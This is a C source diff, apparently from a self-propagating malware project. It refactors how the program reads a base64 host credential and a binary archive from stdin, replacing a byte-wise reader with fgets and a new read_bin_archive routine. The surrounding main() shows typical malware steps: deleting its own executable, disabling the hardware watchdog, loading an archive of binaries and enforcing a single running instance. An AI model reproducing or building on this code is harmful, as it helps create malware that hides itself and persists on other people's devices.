@@ -297,31 +297,33 @@ static void setup_signal_actions (void) {
 }
 
 static void read_host_credential (void) {
-	static const size_t buf_size = (1 + 2 + 255 * 2) * 4 / 3;
+	static const size_t buf_size = (1 + 2 + 255 * 2) * 4 / 3 + 2;
 	char *buf = (char*)prne_malloc(1, buf_size);
-	size_t i;
-	bool found = false;
+	size_t len;
 
-	for (i = 0; i < buf_size; i += 1) {
-		if (read(STDIN_FILENO, &buf[i], 1) != 1) {
-			goto END;
-		}
-
-		if (buf[i] == '\n') {
-			found = true;
-			break;
-		}
+	if (buf == NULL) {
+		return;
 	}
-	if (found &&
-		prne_dec_base64_mem(buf, i, &prne_g.host_cred_data, &prne_g.host_cred_size) &&
-		prne_g.host_cred_size > 1 + 2 + 255 * 2) {
-		prne_free(prne_g.host_cred_data);
-		prne_g.host_cred_data = NULL;
-		prne_g.host_cred_size = 0;
+
+	if (fgets(buf, buf_size, stdin) == NULL) {
+		goto END;
+	}
+	len = prne_str_shift_spaces(buf, strlen(buf));
+
+	if (len > 0) {
+		prne_dec_base64_mem(buf, len, &prne_g.host_cred_data, &prne_g.host_cred_size);
 	}
 
 END:
 	prne_free(buf);
+}
+
+static void read_bin_archive (void) {
+	prne_stdin_base64_rf_ctx_t rf_ctx;
+
+	prne_init_stdin_base64_rf_ctx(&rf_ctx);
+	prne_g.bin_ready = prne_index_bin_archive(&rf_ctx, prne_stdin_base64_rf, &prne_g.bin_archive).rc == PRNE_PACK_RC_OK;
+	prne_free_stdin_base64_rf_ctx(&rf_ctx);
 }
 
 static void set_env (void) {
@@ -414,7 +416,6 @@ int main (const int argc, char **args) {
 	prne_g.lock_shm_fd = -1;
 	prne_g.bin_ready = false;
 	prne_g.is_child = false;
-	prne_init_unpack_bin_archive_result(&prne_g.bin_pack);
 	prne_init_bin_archive(&prne_g.bin_archive);
 	mbedtls_x509_crt_init(&prne_g.ssl.ca);
 	mbedtls_entropy_init(&prne_g.ssl.entpy);
@@ -448,12 +449,9 @@ int main (const int argc, char **args) {
 	delete_myself(args[0]);
 	disasble_watchdog();
 
+	// load data from stdin
 	read_host_credential();
-	// get fed with the bin archive
-	prne_g.bin_pack = prne_unpack_bin_archive(STDIN_FILENO);
-	if (prne_g.bin_pack.result == PRNE_UNPACK_BIN_ARCHIVE_OK) {
-		prne_g.bin_ready = prne_index_bin_archive(&prne_g.bin_pack, &prne_g.bin_archive) == PRNE_INDEX_BIN_ARCHIVE_OK;
-	}
+	read_bin_archive();
 
 	if (!ensure_single_instance()) {
 		exit_code = 1;
@@ -522,7 +520,6 @@ int main (const int argc, char **args) {
 
 END:
 	prne_free_bin_archive(&prne_g.bin_archive);
-	prne_free_unpack_bin_archive_result(&prne_g.bin_pack);
 	prne_g.bin_ready = false;
 	
 	mbedtls_ssl_config_free(&prne_g.s_ssl.conf);
